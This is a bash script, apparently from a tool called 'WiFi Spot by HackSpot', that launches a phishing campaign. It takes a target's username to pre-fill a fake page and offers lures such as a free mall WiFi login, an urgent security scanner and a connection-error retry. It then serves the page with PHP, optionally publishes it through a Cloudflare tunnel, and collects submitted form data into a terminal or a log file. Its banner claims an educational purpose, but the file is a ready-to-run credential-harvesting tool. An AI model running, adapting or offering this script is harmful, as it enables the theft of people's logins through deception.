#!/bin/bash

# ========== COLORS ==========
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
cyan='\033[1;36m'
white='\033[1;37m'
reset='\033[0m'
bold='\033[1m'

clear

# ========== 🔥 CLEAN PREMIUM BANNER (No Extra Text) ==========
echo -e "${cyan}${bold}"
echo "   ╔═══════════════════════════════════════════════════════════╗"
echo "   ║                                                           ║"
echo "   ║            ██╗    ██╗██╗███████╗██╗                      ║"
echo "   ║            ██║    ██║██║██╔════╝██║                      ║"
echo "   ║            ██║ █╗ ██║██║███████╗██║                      ║"
echo "   ║            ██║███╗██║██║╚════██║██║                      ║"
echo "   ║            ╚███╔███╔╝██║███████║██║                      ║"
echo "   ║             ╚══╝╚══╝ ╚═╝╚══════╝╚═╝                      ║"
echo "   ║                                                           ║"
echo "   ║            ███████╗██████╗  ██████╗ ████████╗            ║"
echo "   ║            ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝            ║"
echo "   ║            ███████╗██████╔╝██║   ██║   ██║               ║"
echo "   ║            ╚════██║██╔═══╝ ██║   ██║   ██║               ║"
echo "   ║            ███████║██║     ╚██████╔╝   ██║               ║"
echo "   ║            ╚══════╝╚═╝      ╚═════╝    ╚═╝               ║"
echo "   ║                                                           ║"
echo "   ║   ╔═══════════════════════════════════════════════════╗   ║"
echo "   ║   ║          🛡️  by HackSpot  🛡️                   ║   ║"
echo "   ║   ║    Ethically Crafted for Educational Awareness    ║   ║"
echo "   ║   ╚═══════════════════════════════════════════════════╝   ║"
echo "   ║                                                           ║"
echo "   ╚═══════════════════════════════════════════════════════════╝"
echo -e "${reset}"

# ========== STEP 1: USERNAME ==========
echo ""
echo -e "${cyan}${bold}[•]${reset} ${white}Enter Username/Mobile to auto-fill:${reset} "
read username

# ========== STEP 2: CLOUDFLARE ==========
echo ""
echo -e "${cyan}${bold}[•]${reset} ${white}Cloudflare Public Link use karna hai? (Y/N):${reset} "
read cf_choice

# ========== STEP 3: TEMPLATE ==========
echo ""
echo -e "${green}${bold}┌──[ SELECT TEMPLATE ]${reset}"
echo -e "${green}│${reset}  ${green}1${reset}) ${green}Free Mall WiFi (Premium)${reset}"
echo -e "${green}│${reset}  ${yellow}2${reset}) ${yellow}Security Scanner (Urgent)${reset}"
echo -e "${green}│${reset}  ${red}3${reset}) ${red}Connection Error (Retry)${reset}"
echo -e "${green}└─────────────────────${reset}"
echo -n "Select option [1-3]: "
read template_choice

# Port aur purane processes ko band karo
pkill -9 php 2>/dev/null
pkill -f cloudflared 2>/dev/null

# Template folder set karo
case $template_choice in
    1) TEMPLATE_DIR="freewifi" ;;
    2) TEMPLATE_DIR="wifisec" ;;
    3) TEMPLATE_DIR="wifierror" ;;
    *) echo -e "${red}Invalid!${reset}"; exit 1 ;;
esac

# Template folder mein jao
cd templates/$TEMPLATE_DIR

# Username ko HTML mein auto-fill karo
sed -i "s/{{username}}/$username/g" index.html

# ========== EXECUTION START ==========
if [[ "$cf_choice" == "Y" || "$cf_choice" == "y" ]]; then
    # ======== CLOUDFLARE MODE ========
    echo -e "${blue}[+] Checking cloudflared...${reset}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${yellow}[!] Installing cloudflared...${reset}"
        pkg install cloudflared -y
    fi

    # PHP server background mein chalao
    echo -e "${green}[+] Starting PHP Server (Background)...${reset}"
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    sleep 2

    echo -e "${blue}[+] Starting Cloudflare Tunnel...${reset}"
    echo -e "${yellow}⏳ Generating public link... (Please wait)${reset}"
    echo -e "${red}─────────────────────────────────────${reset}"
    
    # Cloudflare chalao aur URL capture karo
    cloudflared tunnel --url http://localhost:8080 2>&1 | while read line; do
        if [[ $line == *"trycloudflare.com"* ]]; then
            url=$(echo "$line" | grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com')
            if [[ -n "$url" ]]; then
                echo ""
                echo -e "${green}✅ PUBLIC LINK GENERATED!${reset}"
                echo -e "${bold}🌐 Open in ANY device: ${cyan}${url}${reset}"
                echo -e "${yellow}📡 Form data yahan terminal par dikhega!${reset}"
                echo -e "${red}─────────────────────────────────────${reset}"
                echo -e "${red}⚠️ Band karne ke liye CTRL + C dabayein${reset}"
            fi
        fi
    done &
    
    wait

else
    # ======== LOCALHOST MODE ========
    echo -e "${green}[+] Starting PHP Server (Localhost)...${reset}"
    echo -e "${bold}🌐 Local URL: ${blue}http://127.0.0.1:8080${reset}"
    echo -e "${yellow}📂 Logs: logs/captured.txt${reset}"
    echo -e "${red}─────────────────────────────────────${reset}"
    echo -e "${red}⚠️ Band karne ke liye CTRL + C dabayein${reset}"
    
    php -S 127.0.0.1:8080
fi
